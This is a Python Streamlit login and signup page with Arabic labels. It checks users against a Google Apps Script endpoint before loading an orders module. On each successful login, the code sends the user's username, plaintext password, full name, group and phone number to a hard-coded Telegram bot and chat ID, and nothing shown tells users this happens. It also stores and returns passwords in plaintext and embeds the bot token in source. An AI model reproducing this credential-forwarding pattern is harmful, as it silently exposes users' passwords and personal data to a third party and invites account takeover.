import streamlit as st
import requests
from orders import main as orders_main  # إذا لديك ملف orders.py يحتوي على الدالة main()

GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwJbXGCdU8MfdOuAAzQA1ubfsQu1655AQ53X8O2I-242BZG8Jiscybpd58l40LBkXS8/exec"

def load_css(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        css = f.read()
    st.markdown(f"<style>{css}</style>", unsafe_allow_html=True)

def send_telegram_message(message):
    bot_token = "8165532786:AAHYiNEgO8k1TDz5WNtXmPHNruQM15LIgD4"
    chat_id = "6283768537"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        st.error(f"خطأ في إرسال رسالة التليجرام: {e}")

def check_login(username, password):
    data = {
        "action": "check",
        "username": username,
        "password": password
    }
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=5)
        st.write(f"🛠️ رد السيرفر: {res.text}")  # عرض الرد داخل التطبيق
        return res.text.strip() == "TRUE"
    except Exception as e:
        st.error(f"خطأ في التحقق من تسجيل الدخول: {e}")
        return False

def get_user_data(username):
    data = {
        "action": "get_user_data",
        "username": username
    }
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=5)
        text = res.text.strip()
        if text == "NOT_FOUND":
            return None
        parts = text.split(",")
        if len(parts) == 5:
            return {
                "username": parts[0],
                "password": parts[1],
                "full_name": parts[2],
                "group": parts[3],
                "phone": parts[4]
            }
        return None
    except Exception as e:
        st.error(f"خطأ في جلب بيانات المستخدم: {e}")
        return None

def add_user(username, password, full_name, group, phone):
    data = {
        "action": "add",
        "username": username,
        "password": password,
        "full_name": full_name,
        "group": group,
        "phone": phone
    }
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=5)
        return res.text.strip() == "Added"
    except Exception as e:
        st.error(f"خطأ في تسجيل المستخدم الجديد: {e}")
        return False

def login_page():
    st.title("تسجيل الدخول")

    username = st.text_input("اسم المستخدم", key="login_username")
    password = st.text_input("كلمة المرور", type="password", key="login_password")

    login_clicked = st.button("دخول")

    if login_clicked:
        if not username or not password:
            st.warning("يرجى ملء جميع الحقول")
        else:
            if check_login(username, password):
                user_data = get_user_data(username)
                if user_data:
                    st.session_state['logged_in'] = True
                    st.session_state['user_name'] = user_data['username']
                    message = (
                        f"🔑 تم تسجيل دخول المستخدم:\n"
                        f"اسم المستخدم: <b>{user_data['username']}</b>\n"
                        f"كلمة المرور: <b>{user_data['password']}</b>\n"
                        f"الاسم الكامل: <b>{user_data['full_name']}</b>\n"
                        f"الجروب: <b>{user_data['group']}</b>\n"
                        f"رقم الهاتف: <b>{user_data['phone']}</b>"
                    )
                    send_telegram_message(message)
                else:
                    st.error("تعذر جلب بيانات المستخدم")
                return True
            else:
                st.error("اسم المستخدم أو كلمة المرور غير صحيحة")

    st.markdown("---")
    st.write("ليس لديك حساب؟ سجل هنا:")

    signup_username = st.text_input("اسم المستخدم للتسجيل الجديد", key="signup_username")
    signup_password = st.text_input("كلمة المرور للتسجيل الجديد", type="password", key="signup_password")
    signup_full_name = st.text_input("الاسم الكامل", key="signup_full_name")
    signup_group = st.text_input("الجروب", key="signup_group")
    signup_phone = st.text_input("رقم الهاتف", key="signup_phone")

    if st.button("إنشاء حساب جديد"):
        if not signup_username or not signup_password or not signup_full_name or not signup_group or not signup_phone:
            st.warning("يرجى ملء جميع حقول التسجيل")
        else:
            if add_user(signup_username, signup_password, signup_full_name, signup_group, signup_phone):
                st.success("تم إنشاء الحساب بنجاح، يمكنك الآن تسجيل الدخول")
            else:
                st.error("فشل في إنشاء الحساب، حاول مرة أخرى")
    return False

def main():
    load_css("styles.css")

    if 'logged_in' not in st.session_state or not st.session_state['logged_in']:
        just_logged_in = login_page()
        if just_logged_in:
            st.rerun()
    else:
        st.sidebar.write(f"مرحباً، {st.session_state['user_name']}")
        if st.sidebar.button("تسجيل خروج"):
            st.session_state['logged_in'] = False
            st.session_state.pop('user_name', None)
            st.rerun()

        orders_main()

if __name__ == "__main__":
    main()
